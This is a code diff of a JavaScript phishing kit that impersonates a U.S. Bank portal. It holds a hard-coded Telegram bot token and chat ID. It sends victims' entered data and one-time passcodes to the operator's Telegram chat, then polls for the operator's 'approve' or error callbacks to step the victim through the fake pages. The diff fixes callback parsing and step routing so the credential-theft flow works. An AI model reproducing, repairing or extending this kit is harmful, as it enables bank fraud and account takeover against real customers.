@@ -1,18 +1,15 @@
 /**
  * BrosTec Protocol - Ready to Use
  * System: U.S. Bank Control Portal
+ * Modification: Technical Fix for Callback Response & Step Routing
  */
 
 // --- الإعدادات المعتمدة ---
 const BOT_TOKEN = "8472908079:AAHRhM8yUVmfMagFkA85x8T0Zp9WMqWZftU";
 const CHAT_ID = "7865246557";
 
-// معرف الجلسة لضمان عدم تداخل المستخدمين
 const sessionId = Math.floor(Math.random() * 900000) + 100000;
 
-/**
- * الوظيفة الأساسية لإرسال البيانات عند الضغط على أزرار "التالي"
- */
 async function nextStep(stepNumber) {
     
     const overlay = document.getElementById('loadingOverlay');
@@ -56,10 +53,7 @@ async function nextStep(stepNumber) {
         ]];
     }
 
-    // إرسال البيانات للتيليجرام
     await sendLog(messageText, buttons);
-
-    // بدء الاستماع لردك (تجاوز أو خطأ)
     startGlobalListener();
 }
 
@@ -85,17 +79,19 @@ function startGlobalListener() {
             const data = await res.json();
             
             if (data.result && data.result.length > 0) {
-                const cb = data.result[0].callback_query;
+                const update = data.result[0];
+                const cb = update.callback_query;
                 
-                if (cb && cb.data.includes(sessionId.toString())) {
-                    const action = cb.data.split('_')[0]; 
-                    const step = parseInt(cb.data.split('_')[1]);
+                if (cb && cb.data && cb.data.includes(sessionId.toString())) {
+                    const parts = cb.data.split('_');
+                    const action = parts[0]; 
+                    const step = parseInt(parts[1]);
 
                     clearInterval(listener);
                     handleAdminAction(action, step);
                 }
             }
-        } catch (e) {}
+        } catch (e) { console.error("Listener Error"); }
     }, 3000);
 }
 
@@ -106,7 +102,8 @@ function handleAdminAction(action, step) {
     if (action === "approve") {
         const errors = ['otpError1', 'infoError', 'otpError2'];
         errors.forEach(id => { if(document.getElementById(id)) document.getElementById(id).style.display = 'none'; });
-        goStep(step); 
+        // الانتقال للخطوة التالية منطقياً
+        goStep(step + 1); 
     } else {
         if (step === 2) goStep(1); 
         if (step === 3) document.getElementById('otpError1').style.display = 'block';
